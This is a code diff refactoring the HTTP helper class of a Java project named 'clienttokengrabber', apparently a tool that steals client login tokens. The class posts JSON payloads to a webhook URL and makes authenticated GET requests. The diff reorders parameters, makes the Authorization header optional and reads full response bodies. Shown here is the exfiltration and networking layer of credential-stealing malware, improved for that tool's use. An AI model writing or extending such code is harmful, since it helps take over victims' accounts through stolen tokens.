@@ -1,11 +1,10 @@
-package main.java.clienttokengrabber.utils;
+package clienttokengrabber.utils;
 
 import java.io.*;
 import java.util.Base64;
 import java.nio.charset.StandardCharsets;
 import java.net.URL;
 import javax.net.ssl.HttpsURLConnection;
-
 
 public class Requests {
     public static void post(String jsonPayload, String url) {
@@ -23,27 +22,26 @@ public class Requests {
             System.out.println("POST Response Code: " + webhookConnection.getResponseCode());
 
             webhookConnection.disconnect();
-        } catch (Exception ignored) {
-        }
+        } catch (Exception ignored) {}
     }
 
-    public static String get(String token, String urlString) {
+    public static String get(String urlString, String token) {
         try {
             URL url = new URL(urlString);
             HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
-            connection.setRequestProperty("Authorization", token);
+            if (token != null) connection.setRequestProperty("Authorization", token);
 
             int responseCode = connection.getResponseCode();
             System.out.println("GET Response Code: " + responseCode);
             if (responseCode == HttpsURLConnection.HTTP_OK) {
                 BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                String line = reader.readLine();
-
+                StringBuilder response = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) response.append(line);
                 reader.close();
-                return line;
+                return response.toString();
             }
-        } catch (Exception ignored) {
-        }
+        } catch (Exception ignored) {}
         return null;
     }
 
